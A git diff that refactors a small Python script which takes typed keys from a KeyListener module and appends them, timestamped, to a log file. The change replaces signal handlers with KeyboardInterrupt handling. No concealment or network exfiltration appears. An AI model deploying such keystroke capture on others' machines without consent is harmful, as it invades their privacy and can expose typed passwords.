@@ -1,8 +1,7 @@
 import os
 from datetime import datetime
 from key_listener import KeyListener
-import signal
-from functools import partial
+import sys
 
 # --------------------- CONSTANTS --------------------- #
 
@@ -43,31 +42,32 @@ def write_to_log(message: str, log_name: str) -> bool:
         return False
     
 def format_message(content: str) -> str:
-    date = 'DATE -> {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
+    date = 'DATE: {}'.format(datetime.today().strftime('%Y-%m-%d %H:%M:%S'))
     sep = '\n# ---------------------------------------------- #\n'
 
     return '{date}{sep} {content}{sep}\n'.format(date=date, content=content, sep=sep)
 
-def handle_signals(key_listener):
-    typed_keys = key_listener.get_last_keys()
+def handle_keyboard_interrupt(key_listener):
+    typed_keys = key_listener.get_keys()
     message = format_message(typed_keys)
     write_to_log(message, LOG_FILE)
+
+    try:
+        sys.exit(130)
+    except SystemExit:
+        os._exit(130)
 
 # --------------------- MAIN --------------------- #
 
 def main():
-    while True:
-        key_listener = KeyListener()
-        typed_keys = key_listener.read_keys()
-
-        partial_handle_signals_sigint = partial(handle_signals, key_listener)
-        signal.signal(signal.SIGINT, partial_handle_signals_sigint)
-
-        partial_handle_signals_sigtstp = partial(handle_signals, key_listener)
-        signal.signal(signal.SIGTSTP, partial_handle_signals_sigtstp)
-
-        message = format_message(typed_keys)
-        write_to_log(message, LOG_FILE)
+    key_listener = KeyListener()
+    try:
+        while True:
+            typed_keys = key_listener.read_keys()
+            message = format_message(typed_keys)
+            write_to_log(message, LOG_FILE)
+    except KeyboardInterrupt:
+        handle_keyboard_interrupt(key_listener)
 
 if __name__ == "__main__":
     main()
